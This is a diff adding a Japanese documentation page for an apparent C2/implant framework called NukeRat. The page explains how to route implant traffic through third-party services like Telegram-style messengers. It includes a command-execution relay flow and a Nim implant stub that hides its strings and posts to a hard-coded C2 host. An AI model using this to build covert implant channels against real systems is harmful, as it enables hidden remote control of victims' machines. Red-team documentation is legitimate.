@@ -1,0 +1,145 @@
+---
+title: カスタムチャネル
+---
+
+import { Callout } from '@/ui/custom/callout';
+import customChannelMap from '@/assets/img/tutorial/map.png';
+import { ImageZoom } from 'fumadocs-ui/components/image-zoom';
+import { Step, Steps } from 'fumadocs-ui/components/steps';
+
+Telegram、Discord など外部サービス経由の通信チャネルが必要な場合は、このページが対象です。
+
+<Callout
+  type="warning"
+  title="サードパーティプラットフォーム"
+  className="rounded-[6px] border-red-500/70 bg-red-950/50 shadow-red-950/20 [&_svg]:text-red-400 [&_.text-fd-muted-foreground]:text-red-100/95 [&_p.font-medium]:text-red-200"
+>
+  NukeRat プロジェクトは、オペレーターの明示的な許可と適用法令の完全な遵守なしに、サードパーティプラットフォームを C2 として使用することを推奨・促進・影響しません。上記リストの名称は説明用の例にすぎず、プロジェクトによる推奨やガイダンスではありません。
+</Callout>
+
+## 動作の仕組み
+
+カスタムチャネルを構築するには、各要素の関係を簡単に説明します。基本的に 3 つの柱があります。
+
+1. HTTP リスナー
+2. カスタムチャネル付きインプラント
+3. カスタムスクリプト
+
+これらが連携し、インプラントが許可されたサードパーティサービス以外へリクエストを送らずに、インプラントとチームサーバー間の通信を担います。
+
+フローは下図のイメージです。
+
+<ImageZoom src={customChannelMap} alt="カスタムチャネルのフロー" className="tutorial_img" />
+
+### ( 2 ) リスナー
+
+HTTP リスナーの設定が必要です。チームサーバー API も使えますが、説明を分かりやすくするため、例では HTTP リスナーを使います。
+
+### ( 3 ) カスタムスクリプト
+
+最も重要なステップの一つです。選択したサードパーティサービスとリスナーの両方と通信し、一種の「翻訳」を行うスクリプトを書きます。
+
+### ( 4 ) サードパーティプラットフォーム
+
+外部通信チャネルとして選んだプラットフォームです。
+
+### ( 5 ) インプラント
+
+コンパイル時からカスタム通信ロジックを含むインプラントです。
+
+## 通信フロー
+
+構造のイメージがついたら、Telegram に似た外部メッセージングプラットフォームを例にシナリオを追いやすくなります。
+
+  <Steps>
+    <Step>
+      `whoami` コマンドがキューに送られます。
+    </Step>
+    <Step>
+      カスタムスクリプトがループで 5 秒ごとにリスナーと通信し、コマンドを取得します。見つかると外部サービスへリクエストを送り、例えば次のような内容です:
+
+      ```
+      input | 938192 | whoami
+      ```
+    </Step>
+    <Step>
+      外部サービス上に同じ内容のメッセージが表示されます。
+    </Step>
+    <Step>
+      インプラントは API キーやトークンなど、外部サービスへの認証・送信に必要な情報を持った状態で、独自にそのサービスへリクエストします。各リクエストで待機中のコマンドを確認し、見つければ実行します。
+
+      続いて結果を外部サービスへ送り、例えば:
+
+      ```
+      output | 938192 | whoami | root
+      ```
+    </Step>
+    <Step>
+      ループのいずれかでカスタムスクリプトがその出力を検知し、[Implant API](/docs/rest-api/implants) の通信形式に従って、インプラント自身のようにリスナーへリクエストを送ります。その後、外部サービスから該当内容を削除します。
+    </Step>
+    <Step>
+      リスナーがリクエストを受け取り、インプラントトラフィックとして扱い、コマンドを完了します。
+    </Step>
+  </Steps>
+
+## カスタムスクリプト
+
+大きな謎はありません。ループし、選んだ外部サービスを監視し、リスナーへトラフィックを転送するスクリプトを用意するのはあなたの責任です。目的によっては、特に巨大な入出力の分割で複雑さが増します。
+
+## カスタムチャネル
+
+前述のとおり、インプラントは選択したサービス向けの通信ロジックでビルドする必要があり、カスタム実装や一からの作成が必要になることもあります。
+
+インプラント作成時にカスタムチャネルへ進むには、**Command and control** を開き、CHANNEL で **Custom channel** を選択します。
+
+直後に、次のようなコードスタブが表示されるテキストエリアが現れます:
+
+```nim
+
+# imports...
+
+var customServerHost = obf("http://192.168.15.10:9090/")
+const delaySeconds = 2
+customCookies = toTable([
+  (obf("session"), obf("example")),
+  (obf("token"), obf("example")),
+])
+customHeaders = toTable([
+  (obf("User-Agent"), obf("Mozilla/5.0")),
+  (obf("X-Custom-Header"), obf("example")),
+])
+
+proc httpPost(
+    url, payload: string;
+    cookies: Table[string, string];
+    headers: Table[string, string]
+): tuple[code: uint16, body: string] =
+  var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
+  for key, value in headers:
+    pairs.add((key, value))
+  var cookieParts: seq[string] = @[]
+  for key, value in cookies:
+    cookieParts.add(key & obf("=") & value)
+  if cookieParts.len > 0:
+    pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
+  let r = nhttp.winHttpPerform(url, "POST", payload, pairs)
+  (code: r.code, body: r.body)
+
+# Rest of the code...
+```
+
+これはデフォルト HTTP 通信を手続き形式で書いたものにすぎず、より容易にカスタマイズできます。必要に応じてこのロジックを変更してください。
+
+複雑な場合は、断片化や暗号化などの追加ヘルパーを入れることもあります。
+
+## Relay とピボット
+
+調整は面倒ですが必要です。**Implant routine** タブの隣に **Relay forwarder** があり、アウトバウンド relay で使うロジックです。
+
+Relay 設定時、常に最後の relay がチームサーバーへトラフィックを送り、そのトラフィックは HTTP リクエストと JSON の形にする必要があります。このコードブロックがそれを担当します。カスタムチャネルと relay を併用する場合は、こちらも調整が必要です。
+
+なお、**Implant routine** と同じロジックを **Relay forwarder** に適用できることが多いです。
+
+## テストを重ねる
+
+カスタムチャネルの構築は手間がかかり複雑になり得るため、本番で頼る前にロジック全体をテストすることを推奨します。インプラントをビルドするたびに、ロジックが誤っている場合は例外が得られ、開発がはるかに容易になります。
